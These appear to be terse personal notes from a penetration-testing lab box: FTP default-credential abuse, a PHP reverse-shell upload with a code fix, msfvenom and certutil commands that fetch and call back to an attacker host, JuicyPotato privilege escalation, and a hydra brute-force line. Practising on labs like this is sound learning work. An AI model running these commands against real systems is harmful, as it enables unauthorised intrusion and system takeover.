nmap shows only ports 21 ftp and 3389 rdp open
deep nmap reveals additional 242 web, 3145 ftp admin

ftp anonymous login works, but no files we could GET
but the users directory gave an idea about usernames
admin, Offsec

ftp admin:admin worked
gave us .htpasswd file, which had offsec:md5hash"elite" creds

the offsec:elite works for the webpage login
seeing it works, and guessing the ftp admin:admin is basically the webpages that we can access, we decide to throw in a php rev shell and see what happens

Bunch of reverse shells we try, and run into issues
After going to Ivan's php rev shell github, and looking at closed issues, do we see the parse error for `[`
the solution was there
```
replace
$size = fstat($input)['size'];
with
$fstat_input = fstat($input);
$size = $fstat_input['size'];
```
And it finally works, we get apache!

---
no powershell on the system, tf?!?!
anyways, impersonate is up, so is spooler
so we send the god over to do its work
but this old windows 2008 server, god did not work, so send over juicy potato
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.200 LPORT=21 -f exe -o rshell.exe` --32-bit reverse shell

```cmd
certutil -urlcache -split -f "http://192.168.45.200/rshell.exe" rshell.exe
certutil -urlcache -split -f "http://192.168.45.200/jp.exe" jp.exe
.\jp.exe -l 1337 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" -p rshell.exe -t *
```

---
---
---
Alternatively, we could have brute-forced the admin password for ftp
```zsh
hydra -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -f ftp://192.168.68.46
```